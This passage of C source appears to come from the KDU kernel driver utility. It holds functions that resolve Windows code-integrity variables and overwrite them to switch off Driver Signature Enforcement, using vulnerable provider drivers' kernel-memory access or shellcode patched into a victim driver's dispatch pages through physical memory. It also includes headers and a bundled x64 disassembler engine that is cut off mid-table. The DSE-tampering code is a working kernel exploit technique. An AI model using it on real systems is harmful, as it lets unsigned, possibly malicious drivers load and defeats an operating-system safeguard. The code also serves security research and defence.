ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
    _In_ ULONG NtBuildNumber
)
{
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    LPCSTR lpSymbolName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (symInit() == FALSE)
        return 0;

    szFullModuleName[0] = 0;
    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
        return 0;

    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
        lpSymbolName = (LPCSTR)"g_CiEnabled";
    }
    else {
        lpModuleName = (LPWSTR)CI_DLL;
        lpSymbolName = (LPCSTR)"g_CiOptions";
    }
    _strcat(szFullModuleName, TEXT("\\"));
    _strcat(szFullModuleName, lpModuleName);

    //
    // Query loaded (kernel) base of target module.
    //
    if (NtBuildNumber < NT_WIN8_RTM) {
        imageLoadedBase = supGetNtOsBase();
    }
    else {
        imageLoadedBase = supGetModuleBaseByName(lpModuleName, NULL);
    }

    if (imageLoadedBase == 0) {
        supPrintfEvent(kduEventError,
            "[!] Could not query \"%ws\" loaded base\r\n",
            lpModuleName);
        return 0;
    }

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ws\" loaded for symbols lookup\r\n", lpModuleName);

        if (symLoadImageSymbols(lpModuleName, (PVOID)mappedImageBase, 0)) {

            if (symLookupAddressBySymbol(lpSymbolName, &kernelAddress)) {

                Result = (ULONG_PTR)imageLoadedBase + kernelAddress - (ULONG_PTR)mappedImageBase;
                supPrintfEvent(kduEventInformation, "[+] Symbol resolved to 0x%llX address\r\n", Result);

            }
            else {
                supPrintfEvent(kduEventError, "[!] Unable to find specified symbol\r\n");
            }

        }
        else {
            supPrintfEvent(kduEventError, "[!] Unable to load symbols for file\r\n");
        }

        FreeLibrary(mappedImageBase);
    }
    else {

        supPrintfEvent(kduEventError,
            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}

/*
* KDUQueryCodeIntegrityVariableAddress
*
* Purpose:
*
* Find CI variable address.
* Depending on NT version search in ntoskrnl.exe or ci.dll
*
*/
ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
    _In_ ULONG NtBuildNumber
)
{
    NTSTATUS ntStatus;
    ULONG loadedImageSize = 0;
    SIZE_T sizeOfImage = 0;
    ULONG_PTR Result = 0, imageLoadedBase, kernelAddress = 0;
    LPWSTR lpModuleName;
    HMODULE mappedImageBase;

    WCHAR szFullModuleName[MAX_PATH * 2];

    if (NtBuildNumber < NT_WIN8_RTM) {
        lpModuleName = (LPWSTR)NTOSKRNL_EXE;
    }
    else {
        lpModuleName = (LPWSTR)CI_DLL;
    }

    imageLoadedBase = supGetModuleBaseByName(lpModuleName, &loadedImageSize);
    if (imageLoadedBase == 0) {

        supPrintfEvent(kduEventError,
            "[!] Abort, could not query \"%ws\" image base\r\n", lpModuleName);

        return 0;
    }

    szFullModuleName[0] = 0;
    if (!GetSystemDirectory(szFullModuleName, MAX_PATH))
        return 0;

    _strcat(szFullModuleName, TEXT("\\"));
    _strcat(szFullModuleName, lpModuleName);

    //
    // Preload module for pattern search.
    //
    mappedImageBase = LoadLibraryEx(szFullModuleName, NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (mappedImageBase) {

        printf_s("[+] Module \"%ws\" loaded for pattern search\r\n", lpModuleName);

        if (NtBuildNumber < NT_WIN8_RTM) {

            ntStatus = supQueryImageSize(mappedImageBase,
                &sizeOfImage);

            if (NT_SUCCESS(ntStatus)) {

                ntStatus = KDUQueryCiEnabled(mappedImageBase,
                    imageLoadedBase,
                    &kernelAddress,
                    sizeOfImage);

            }

        }
        else {

            ntStatus = KDUQueryCiOptions(mappedImageBase,
                imageLoadedBase,
                &kernelAddress,
                NtBuildNumber);

        }

        if (NT_SUCCESS(ntStatus)) {

            if (IN_REGION(kernelAddress,
                imageLoadedBase,
                loadedImageSize))
            {
                Result = kernelAddress;
            }
            else {

                supPrintfEvent(kduEventError,
                    "[!] Resolved address 0x%llX does not belong required module.\r\n",
                    kernelAddress);

            }

        }
        else {
            supShowHardError("[!] Failed to locate kernel variable address", ntStatus);
        }

        FreeLibrary(mappedImageBase);

    }
    else {

        //
        // Output error.
        //
        supPrintfEvent(kduEventError,
            "[!] Could not load \"%ws\", GetLastError %lu\r\n",
            lpModuleName,
            GetLastError());

    }

    return Result;
}

/*
* KDUControlDSE2
*
* Purpose:
*
* Change Windows CodeIntegrity flags using memory brute-force.
*
*/
BOOL KDUControlDSE2(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    BYTE shellBuffer[SHELLCODE_SMALL];
    SIZE_T shellSize;

    KDU_PROVIDER* prov;
    KDU_VICTIM_PROVIDER* victimProv;
    HANDLE victimDeviceHandle = NULL;

    KDU_PHYSMEM_ENUM_PARAMS enumParams;
    VICTIM_IMAGE_INFORMATION vi;

    prov = Context->Provider;
    victimProv = Context->Victim;

    shellSize = (ULONG_PTR)BaseShellDSEFixEnd - (ULONG_PTR)BaseShellDSEFix;

    //
    // Validate shell size.
    //
    // 0xC offset + sizeof(ULONG_PTR)
    //
    if (shellSize < 20) {
        supPrintfEvent(kduEventError, 
            "[!] Shellcode too small for required patch offsets (size=0x%llX)\r\n", shellSize);
        return FALSE;
    }
    
    if (shellSize > SHELLCODE_SMALL) {
        supPrintfEvent(kduEventError,
            "[!] Patch code size 0x%llX exceeds limit 0x%lX, abort\r\n", shellSize, SHELLCODE_SMALL);

        return FALSE;
    }
    
    //
    // Copy and patch shellcode.
    //
    RtlFillMemory(shellBuffer, sizeof(shellBuffer), 0xCC);
    RtlCopyMemory(shellBuffer, BaseShellDSEFix, shellSize);

    *(PULONG_PTR)&shellBuffer[0x2] = Address;
    *(PULONG_PTR)&shellBuffer[0xC] = DSEValue;

    printf_s("[+] DSE flags (0x%p) new value to be written: %lX\r\n",
        (PVOID)Address,
        DSEValue);

    //
    // Preload / open victim driver.
    //
    if (!VpCreate(victimProv,
        Context->ModuleBase,
        &victimDeviceHandle,
        NULL,
        NULL))
    {
        supPrintfEvent(kduEventError,
            "[!] Error preloading victim driver, abort\r\n");
        return FALSE;
    }

    printf_s("[+] Victim is accepted, handle 0x%p\r\n", victimDeviceHandle);

    RtlSecureZeroMemory(&vi, sizeof(vi));
    if (!VpQueryInformation(
        Context->Victim, VictimImageInformation, &vi, sizeof(vi)))
    {
        supShowWin32Error("[!] Cannot query victim image information", GetLastError());
    }
    else {

        enumParams.DispatchHandlerOffset = vi.DispatchOffset;
        enumParams.DispatchHandlerPageOffset = vi.DispatchPageOffset;
        enumParams.JmpAddress = vi.JumpValue;
        enumParams.DeviceHandle = Context->DeviceHandle;
        enumParams.ReadPhysicalMemory = Context->Provider->Callbacks.ReadPhysicalMemory;
        enumParams.WritePhysicalMemory = Context->Provider->Callbacks.WritePhysicalMemory;

        enumParams.DispatchSignature = Context->Victim->Data.DispatchSignature;
        enumParams.DispatchSignatureLength = Context->Victim->Data.DispatchSignatureLength;

        enumParams.bWrite = TRUE;
        enumParams.ccPagesFound = 0;
        enumParams.ccPagesModified = 0;
        enumParams.pvPayload = shellBuffer;
        enumParams.cbPayload = (ULONG)shellSize;

        supPrintfEvent(kduEventInformation,
            "[+] Looking for %ws driver dispatch memory pages, please wait\r\n", victimProv->Name);

        if (supEnumeratePhysicalMemory(KDUPagePatchCallback, &enumParams)) {

            printf_s("[+] Number of pages found: %llu, modified: %llu\r\n",
                enumParams.ccPagesFound,
                enumParams.ccPagesModified);

            //
            // Run shellcode.
            //
            VpExecutePayload(victimProv, &victimDeviceHandle);

            supPrintfEvent(kduEventInformation,
                "[+] DSE patch executed successfully\r\n");

            bResult = TRUE;
        }

    }

    //
    // Cleanup.
    //
    if (VpRelease(victimProv, &victimDeviceHandle)) {
        printf_s("[+] Victim released\r\n");
    }

    return bResult;
}

/*
* KDUControlDSE
*
* Purpose:
*
* Change Windows CodeIntegrity flags state.
*
*/
BOOL KDUControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address
)
{
    BOOL bResult = FALSE;
    ULONG ulFlags = 0;

    FUNCTION_ENTER_MSG(__FUNCTION__);

    //
    // Read current flags state.
    //
    bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
        Address,
        &ulFlags,
        sizeof(ulFlags));

    if (!bResult) {
        supShowWin32Error("[!] Cannot query DSE state", GetLastError());
    }
    else {

        printf_s("[+] DSE flags (0x%p) value: %lX, new value to be written: %lX\r\n",
            (PVOID)Address,
            ulFlags,
            DSEValue);

        if (DSEValue == ulFlags) {
            printf_s("[~] Warning, current value is identical to what you want to write\r\n");
        }

        DWORD dwLastError;

        bResult = Context->Provider->Callbacks.WriteKernelVM(Context->DeviceHandle,
            Address,
            &DSEValue,
            sizeof(DSEValue));

        dwLastError = GetLastError();

        if (bResult) {

            printf_s("[+] Kernel memory write complete, verifying data\r\n");

            //
            // Verify write.
            //
            ulFlags = 0;
            bResult = Context->Provider->Callbacks.ReadKernelVM(Context->DeviceHandle,
                Address,
                &ulFlags,
                sizeof(ulFlags));

            dwLastError = GetLastError();

            if (bResult) {

                bResult = (ulFlags == DSEValue);

                supPrintfEvent(
                    (bResult == FALSE) ? kduEventError : kduEventInformation,
                    "%s Write result verification %s\r\n",
                    (bResult == FALSE) ? "[!]" : "[+]",
                    (bResult == FALSE) ? "failed" : "succeeded");


            }
            else {
                supShowWin32Error("[!] Cannot verify kernel memory write", dwLastError);
            }
        }
        else {
            supShowWin32Error("[!] Error while writing to the kernel memory", dwLastError);
        }

    }

    FUNCTION_LEAVE_MSG(__FUNCTION__);

    return bResult;
}

```

`Source/Hamakaze/dsefix.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2014 - 2025
*
*  TITLE:       DSEFIX.H
*
*  VERSION:     1.45
*
*  DATE:        02 Dec 2025
*
*  CI DSE corruption prototypes and definitions.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

ULONG_PTR KDUQueryCodeIntegrityVariableAddress(
    _In_ ULONG NtBuildNumber);

ULONG_PTR KDUQueryCodeIntegrityVariableSymbol(
    _In_ ULONG NtBuildNumber);

BOOL KDUControlDSE(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);

BOOL KDUControlDSE2(
    _In_ PKDU_CONTEXT Context,
    _In_ ULONG DSEValue,
    _In_ ULONG_PTR Address);


```

`Source/Hamakaze/global.h`:

```h
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       GLOBAL.H
*
*  VERSION:     1.44
*
*  DATE:        18 Aug 2025
*
*  Common include header file.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

#if !defined UNICODE
#error ANSI build is not supported
#endif

//
// Ignored warnings
//
#pragma warning(disable: 4005) // macro redefinition
#pragma warning(disable: 4091) // 'typedef ': ignored on left of '%s' when no variable is declared
#pragma warning(disable: 4201) // nameless struct/union
#pragma warning(disable: 26812) // Prefer 'enum class' over 'enum'

#define KDU_SHELLCODE_NONE  (0)
#define KDU_SHELLCODE_V1    (1)
#define KDU_SHELLCODE_V2    (2)
#define KDU_SHELLCODE_V3    (3)
#define KDU_SHELLCODE_V4    (4)
#define KDU_SHELLCODE_VMAX  KDU_SHELLCODE_V4

#include <Windows.h>
#include <strsafe.h>
#include <ntstatus.h>
#include <intrin.h>
#include <rpc.h>
#include <SetupAPI.h>
#include <newdev.h>
#include <Bcrypt.h>
#include<fltuser.h>

#if defined(__cplusplus)
extern "C" {
#endif

#include "hde/hde64.h"
#include "minirtl/minirtl.h"
#include "minirtl/rtltypes.h"
#include "minirtl/cmdline.h"
#include "minirtl/_filename.h"

#ifdef __cplusplus
}
#endif

#include "ntos/ntos.h"
#include "ntos/halamd64.h"
#include "ntos/ntbuilds.h"
#include "ntos/ntsup.h"
#include "ldr/ldr.h"
#include "wdksup.h"
#include "resource.h"

#pragma comment(lib, "Rpcrt4.lib")
#pragma comment(lib, "Setupapi.lib")
#pragma comment(lib, "Newdev.lib")
#pragma comment(lib, "Bcrypt.lib")
#pragma comment(lib, "FltLib.lib")

#include "shared/consts.h"
#include "shared/kdubase.h"
#include "sig.h"
#include "ipcsvc.h"
#include "sup.h"
#include "sym.h"
#include "compress.h"
#include "victim.h"
#include "kduprov.h"
#include "shellcode.h"
#include "drvmap.h"
#include "ps.h"
#include "pagewalk.h"
#include "dsefix.h"
#include "diag.h"
#include "tests.h"

#define ASSERT_RESOLVED_FUNC(FunctionPtr) { if (FunctionPtr == 0) break; }
#define ASSERT_RESOLVED_FUNC_ABORT(FunctionPtr) { if (FunctionPtr == 0) return FALSE; }

```

`Source/Hamakaze/hde/hde64.c`:

```c
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#include "hde64.h"
#include "table64.h"

#pragma warning(push)
#pragma warning(disable:4701)
#pragma warning(disable:4706)
#pragma warning(disable:26451)

unsigned int hde64_disasm(const void *code, hde64s *hs)
{
    uint8_t x, c = 0, *p = (uint8_t *)code, cflags, opcode, pref = 0;
    uint8_t *ht = hde64_table, m_mod, m_reg, m_rm, disp_size = 0;
    uint8_t op64 = 0;

    // Avoid using memset to reduce the footprint.
#ifndef _MSC_VER
    memset((LPBYTE)hs, 0, sizeof(hde64s));
#else
    __stosb((LPBYTE)hs, 0, sizeof(hde64s));
#endif

    for (x = 16; x; x--)
        switch (c = *p++) {
            case 0xf3:
                hs->p_rep = c;
                pref |= PRE_F3;
                break;
            case 0xf2:
                hs->p_rep = c;
                pref |= PRE_F2;
                break;
            case 0xf0:
                hs->p_lock = c;
                pref |= PRE_LOCK;
                break;
            case 0x26: case 0x2e: case 0x36:
            case 0x3e: case 0x64: case 0x65:
                hs->p_seg = c;
                pref |= PRE_SEG;
                break;
            case 0x66:
                hs->p_66 = c;
                pref |= PRE_66;
                break;
            case 0x67:
                hs->p_67 = c;
                pref |= PRE_67;
                break;
            default:
                goto pref_done;
        }
  pref_done:

    hs->flags = (uint32_t)pref << 23;

    if (!pref)
        pref |= PRE_NONE;

    if ((c & 0xf0) == 0x40) {
        hs->flags |= F_PREFIX_REX;
        if ((hs->rex_w = (c & 0xf) >> 3) && (*p & 0xf8) == 0xb8)
            op64++;
        hs->rex_r = (c & 7) >> 2;
        hs->rex_x = (c & 3) >> 1;
        hs->rex_b = c & 1;
        if (((c = *p++) & 0xf0) == 0x40) {
            opcode = c;
            goto error_opcode;
        }
    }

    if ((hs->opcode = c) == 0x0f) {
        hs->opcode2 = c = *p++;
        ht += DELTA_OPCODES;
    } else if (c >= 0xa0 && c <= 0xa3) {
        op64++;
        if (pref & PRE_67)
            pref |= PRE_66;
        else
            pref &= ~PRE_66;
    }

    opcode = c;
    cflags = ht[ht[opcode / 4] + (opcode % 4)];

    if (cflags == C_ERROR) {
      error_opcode:
        hs->flags |= F_ERROR | F_ERROR_OPCODE;
        cflags = 0;
        if ((opcode & -3) == 0x24)
            cflags++;
    }

    x = 0;
    if (cflags & C_GROUP) {
        uint16_t t;
        t = *(uint16_t *)(ht + (cflags & 0x7f));
        cflags = (uint8_t)t;
        x = (uint8_t)(t >> 8);
    }

    if (hs->opcode2) {
        ht = hde64_table + DELTA_PREFIXES;
        if (ht[ht[opcode / 4] + (opcode % 4)] & pref)
            hs->flags |= F_ERROR | F_ERROR_OPCODE;
    }

    if (cflags & C_MODRM) {
        hs->flags |= F_MODRM;
        hs->modrm = c = *p++;
        hs->modrm_mod = m_mod = c >> 6;
        hs->modrm_rm = m_rm = c & 7;
        hs->modrm_reg = m_reg = (c & 0x3f) >> 3;

        if (x && ((x << m_reg) & 0x80))
            hs->flags |= F_ERROR | F_ERROR_OPCODE;

        if (!hs->opcode2 && opcode >= 0xd9 && opcode <= 0xdf) {
            uint8_t t = opcode - 0xd9;
            if (m_mod == 3) {
                ht = hde64_table + DELTA_FPU_MODRM + t*8;
                t = ht[m_reg] << m_rm;
            } else {
                ht = hde64_table + DELTA_FPU_REG;
                t = ht[t] << m_reg;
            }
            if (t & 0x80)
                hs->flags |= F_ERROR | F_ERROR_OPCODE;
        }

        if (pref & PRE_LOCK) {
            if (m_mod == 3) {
                hs->flags |= F_ERROR | F_ERROR_LOCK;
            } else {
                uint8_t *table_end, op = opcode;
                if (hs->opcode2) {
                    ht = hde64_table + DELTA_OP2_LOCK_OK;
                    table_end = ht + DELTA_OP_ONLY_MEM - DELTA_OP2_LOCK_OK;
                } else {
                    ht = hde64_table + DELTA_OP_LOCK_OK;
                    table_end = ht + DELTA_OP2_LOCK_OK - DELTA_OP_LOCK_OK;
                    op &= -2;
                }
                for (; ht != table_end; ht++)
                    if (*ht++ == op) {
                        if (!((*ht << m_reg) & 0x80))
                            goto no_lock_error;
                        else
                            break;
                    }
                hs->flags |= F_ERROR | F_ERROR_LOCK;
              no_lock_error:
                ;
            }
        }

        if (hs->opcode2) {
            switch (opcode) {
                case 0x20: case 0x22:
                    m_mod = 3;
                    if (m_reg > 4 || m_reg == 1)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x21: case 0x23:
                    m_mod = 3;
                    if (m_reg == 4 || m_reg == 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        } else {
            switch (opcode) {
                case 0x8c:
                    if (m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
                case 0x8e:
                    if (m_reg == 1 || m_reg > 5)
                        goto error_operand;
                    else
                        goto no_error_operand;
            }
        }

        if (m_mod == 3) {
            uint8_t *table_end;
            if (hs->opcode2) {
                ht = hde64_table + DELTA_OP2_ONLY_MEM;
                table_end = ht + sizeof(hde64_table) - DELTA_OP2_ONLY_MEM;
            } else {
                ht = hde64_table + DELTA_OP_ONLY_MEM;
                table_end = ht + DELTA_OP2_ONLY_MEM - DELTA_OP_ONLY_MEM;
            }
            for (; ht != table_end; ht += 2)
                if (*ht++ == opcode) {
                    if (*ht++ & pref && !((*ht << m_reg) & 0x80))
                        goto error_operand;
                    else
                        break;
                }
            goto no_error_operand;
        } else if (hs->opcode2) {
            switch (opcode) {
                case 0x50: case 0xd7: case 0xf7:
                    if (pref & (PRE_NONE | PRE_66))
                        goto error_operand;
                    break;
                case 0xd6:
                    if (pref & (PRE_F2 | PRE_F3))
                        goto error_operand;
                    break;
                case 0xc5:
                    goto error_operand;
            }
            goto no_error_operand;
        } else
            goto no_error_operand;

      error_operand:
        hs->flags |= F_ERROR | F_ERROR_OPERAND;
      no_error_operand:

        c = *p++;
        if (m_reg <= 1) {
            if (opcode == 0xf6)
                cflags |= C_IMM8;
            else if (opcode == 0xf7)
                cflags |= C_IMM_P66;
        }

        switch (m_mod) {
            case 0:
                if (pref & PRE_67) {
                    if (m_rm == 6)
                        disp_size = 2;
                } else
                    if (m_rm == 5)
                        disp_size = 4;
                break;
            case 1:
                disp_size = 1;
                break;
            case 2:
                disp_size = 2;
                if (!(pref & PRE_67))
                    disp_size <<= 1;
        }

        if (m_mod != 3 && m_rm == 4) {
            hs->flags |= F_SIB;
            p++;
            hs->sib = c;
            hs->sib_scale = c >> 6;
            hs->sib_index = (c & 0x3f) >> 3;
            if ((hs->sib_base = c & 7) == 5 && !(m_mod & 1))
                disp_size = 4;
        }

        p--;
        switch (disp_size) {
            case 1:
                hs->flags |= F_DISP8;
                hs->disp.disp8 = *p;
                break;
            case 2:
                hs->flags |= F_DISP16;
                hs->disp.disp16 = *(uint16_t *)p;
                break;
            case 4:
                hs->flags |= F_DISP32;
                hs->disp.disp32 = *(uint32_t *)p;
        }
        p += disp_size;
    } else if (pref & PRE_LOCK)
        hs->flags |= F_ERROR | F_ERROR_LOCK;

    if (cflags & C_IMM_P66) {
        if (cflags & C_REL32) {
            if (pref & PRE_66) {
                hs->flags |= F_IMM16 | F_RELATIVE;
                hs->imm.imm16 = *(uint16_t *)p;
                p += 2;
                goto disasm_done;
            }
            goto rel32_ok;
        }
        if (op64) {
            hs->flags |= F_IMM64;
            hs->imm.imm64 = *(uint64_t *)p;
            p += 8;
        } else if (!(pref & PRE_66)) {
            hs->flags |= F_IMM32;
            hs->imm.imm32 = *(uint32_t *)p;
            p += 4;
        } else
            goto imm16_ok;
    }


    if (cflags & C_IMM16) {
      imm16_ok:
        hs->flags |= F_IMM16;
        hs->imm.imm16 = *(uint16_t *)p;
        p += 2;
    }
    if (cflags & C_IMM8) {
        hs->flags |= F_IMM8;
        hs->imm.imm8 = *p++;
    }

    if (cflags & C_REL32) {
      rel32_ok:
        hs->flags |= F_IMM32 | F_RELATIVE;
        hs->imm.imm32 = *(uint32_t *)p;
        p += 4;
    } else if (cflags & C_REL8) {
        hs->flags |= F_IMM8 | F_RELATIVE;
        hs->imm.imm8 = *p++;
    }

  disasm_done:

    if ((hs->len = (uint8_t)(p-(uint8_t *)code)) > 15) {
        hs->flags |= F_ERROR | F_ERROR_LENGTH;
        hs->len = 15;
    }

    return (unsigned int)hs->len;
}
#pragma warning(pop)

```

`Source/Hamakaze/hde/hde64.h`:

```h
/*
 * Hacker Disassembler Engine 64
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 * hde64.h: C/C++ header file
 *
 */

#ifndef _HDE64_H_
#define _HDE64_H_

/* stdint.h - C99 standard header
 * http://en.wikipedia.org/wiki/stdint.h
 *
 * if your compiler doesn't contain "stdint.h" header (for
 * example, Microsoft Visual C++), you can download file:
 *   http://www.azillionmonkeys.com/qed/pstdint.h
 * and change next line to:
 *   #include "pstdint.h"
 */
#include "pstdint.h"

#define F_MODRM         0x00000001
#define F_SIB           0x00000002
#define F_IMM8          0x00000004
#define F_IMM16         0x00000008
#define F_IMM32         0x00000010
#define F_IMM64         0x00000020
#define F_DISP8         0x00000040
#define F_DISP16        0x00000080
#define F_DISP32        0x00000100
#define F_RELATIVE      0x00000200
#define F_ERROR         0x00001000
#define F_ERROR_OPCODE  0x00002000
#define F_ERROR_LENGTH  0x00004000
#define F_ERROR_LOCK    0x00008000
#define F_ERROR_OPERAND 0x00010000
#define F_PREFIX_REPNZ  0x01000000
#define F_PREFIX_REPX   0x02000000
#define F_PREFIX_REP    0x03000000
#define F_PREFIX_66     0x04000000
#define F_PREFIX_67     0x08000000
#define F_PREFIX_LOCK   0x10000000
#define F_PREFIX_SEG    0x20000000
#define F_PREFIX_REX    0x40000000
#define F_PREFIX_ANY    0x7f000000

#define PREFIX_SEGMENT_CS   0x2e
#define PREFIX_SEGMENT_SS   0x36
#define PREFIX_SEGMENT_DS   0x3e
#define PREFIX_SEGMENT_ES   0x26
#define PREFIX_SEGMENT_FS   0x64
#define PREFIX_SEGMENT_GS   0x65
#define PREFIX_LOCK         0xf0
#define PREFIX_REPNZ        0xf2
#define PREFIX_REPX         0xf3
#define PREFIX_OPERAND_SIZE 0x66
#define PREFIX_ADDRESS_SIZE 0x67

#pragma pack(push,1)

typedef struct {
    uint8_t len;
    uint8_t p_rep;
    uint8_t p_lock;
    uint8_t p_seg;
    uint8_t p_66;
    uint8_t p_67;
    uint8_t rex;
    uint8_t rex_w;
    uint8_t rex_r;
    uint8_t rex_x;
    uint8_t rex_b;
    uint8_t opcode;
    uint8_t opcode2;
    uint8_t modrm;
    uint8_t modrm_mod;
    uint8_t modrm_reg;
    uint8_t modrm_rm;
    uint8_t sib;
    uint8_t sib_scale;
    uint8_t sib_index;
    uint8_t sib_base;
    union {
        uint8_t imm8;
        uint16_t imm16;
        uint32_t imm32;
        uint64_t imm64;
    } imm;
    union {
        uint8_t disp8;
        uint16_t disp16;
        uint32_t disp32;
    } disp;
    uint32_t flags;
} hde64s;

#pragma pack(pop)

#ifdef __cplusplus
extern "C" {
#endif

/* __cdecl */
unsigned int hde64_disasm(const void *code, hde64s *hs);

#ifdef __cplusplus
}
#endif

#endif /* _HDE64_H_ */

```

`Source/Hamakaze/hde/pstdint.h`:

```h
/*
 *  MinHook - The Minimalistic API Hooking Library for x64/x86
 *  Copyright (C) 2009-2015 Tsuda Kageyu. All rights reserved.
 *
 *  Redistribution and use in source and binary forms, with or without
 *  modification, are permitted provided that the following conditions
 *  are met:
 *
 *  1. Redistributions of source code must retain the above copyright
 *     notice, this list of conditions and the following disclaimer.
 *  2. Redistributions in binary form must reproduce the above copyright
 *     notice, this list of conditions and the following disclaimer in the
 *     documentation and/or other materials provided with the distribution.
 *
 *  THIS SOFTWARE IS PROVIDED BY THE AUTHOR "AS IS" AND ANY EXPRESS OR
 *  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 *  OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 *  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 *  INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 *  NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 *  DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 *  THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 *  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 *  THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

#pragma once

#include <windows.h>

// Integer types for HDE.
typedef INT8   int8_t;
typedef INT16  int16_t;
typedef INT32  int32_t;
typedef INT64  int64_t;
typedef UINT8  uint8_t;
typedef UINT16 uint16_t;
typedef UINT32 uint32_t;
typedef UINT64 uint64_t;

```

`Source/Hamakaze/hde/table64.h`:

```h
/*
 * Hacker Disassembler Engine 64 C
 * Copyright (c) 2008-2009, Vyacheslav Patkov.
 * All rights reserved.
 *
 */

#define C_NONE    0x00
#define C_MODRM   0x01
#define C_IMM8    0x02
#define C_IMM16   0x04
#define C_IMM_P66 0x10
#define C_REL8    0x20
#define C_REL32   0x40
#define C_GROUP   0x80
#define C_ERROR   0xff

#define PRE_ANY  0x00
#define PRE_NONE 0x01
#define PRE_F2   0x02
#define PRE_F3   0x04
#define PRE_66   0x08
#define PRE_67   0x10
#define PRE_LOCK 0x20
#define PRE_SEG  0x40
#define PRE_ALL  0xff

#define DELTA_OPCODES      0x4a
#define DELTA_FPU_REG      0xfd
#define DELTA_FPU_MODRM    0x104
#define DELTA_PREFIXES     0x13c
#define DELTA_OP_LOCK_OK   0x1ae
#define DELTA_OP2_LOCK_OK  0x1c6
#define DELTA_OP_ONLY_MEM  0x1d8
#define DELTA_OP2_ONLY_MEM 0x1e7

unsigned char hde64_table[] = {
  0xa5,0xaa,0xa5,0xb8,0xa5,0xaa,0xa5,0xaa,0xa5,0xb8,0xa5,0xb8,0xa5,0xb8,0xa5,
  0xb8,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xc0,0xac,0xc0,0xcc,0xc0,0xa1,0xa1,
  0xa1,0xa1,0xb1,0xa5,0xa5,0xa6,0xc0,0xc0,0xd7,0xda,0xe0,0xc0,0xe4,0xc0,0xea,
  0xea,0xe0,0xe0,0x98,0xc8,0xee,0xf1,0xa5,0xd3,0xa5,0xa5,0xa1,0xea,0x9e,0xc0,
  0xc0,0xc2,0xc0,0xe6,0x03,0x7f,0x11,0x7f,0x01,0x7f,0x01,0x3f,0x01,0x01,0xab,
  0x8b,0x90,0x64,0x5b,0x5b,0x5b,0x5b,0x5b,0x92,0x5b,0x5b,0x76,0x90,0x92,0x92,
  0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x6a,0x73,0x90,
  0x5b,0x52,0x52,0x52,0x52,0x5b,0x5b,0x5b,0x5b,0x77,0x7c,0x77,0x85,0x5b,0x5b,
  0x70,0x5b,0x7a,0xaf,0x76,0x76,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,0x5b,
  0x5b,0x5b,0x86,0x01,0x03,0x01,0x04,0x03,0xd5,0x03,0xd5,0x03,0xcc,0x01,0xbc,
  0x03,0xf0,0x03,0x03,0x04,0x00,0x50,0x50,0x50,0x50,0xff,0x20,0x20,0x20,0x20,
  0x01,0x01,0x01,0x01,0xc4,0x02,0x10,0xff,0xff,0xff,0x01,0x00,0x03,0x11,0xff,
  0x03,0xc4,0xc6,0xc8,0x02,0x10,0x00,0xff,0xcc,0x01,0x01,0x01,0x00,0x00,0x00,
  0x00,0x01,0x01,0x03,0x01,0xff,0xff,0xc0,0xc2,0x10,0x11,0x02,0x03,0x01,0x01,
  0x01,0xff,0xff,0xff,0x00,0x00,0x00,0xff,0x00,0x00,0xff,0xff,0xff,0xff,0x10,
